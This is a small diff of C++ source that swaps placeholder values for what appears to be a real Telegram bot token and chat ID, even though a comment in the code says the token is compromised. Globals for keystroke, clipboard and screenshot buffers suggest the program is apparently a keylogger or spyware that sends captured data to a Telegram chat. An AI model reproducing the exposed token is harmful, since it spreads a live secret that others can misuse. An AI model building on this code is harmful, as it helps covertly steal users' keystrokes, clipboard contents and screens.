@@ -19,8 +19,8 @@
 
 // ⚠️ SECURITY WARNING: Replace with your NEW credentials!
 // Your current token is COMPROMISED - revoke it in @BotFather immediately!
-const wchar_t* BOT_TOKEN = L"YOUR_NEW_BOT_TOKEN_HERE";
-const wchar_t* CHAT_ID = L"YOUR_CHAT_ID_HERE";
+const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
+const wchar_t* CHAT_ID = L"7845441585";
 
 std::wstring keyBuffer, clipBuffer;
 std::vector<BYTE> screenshotBuffer;
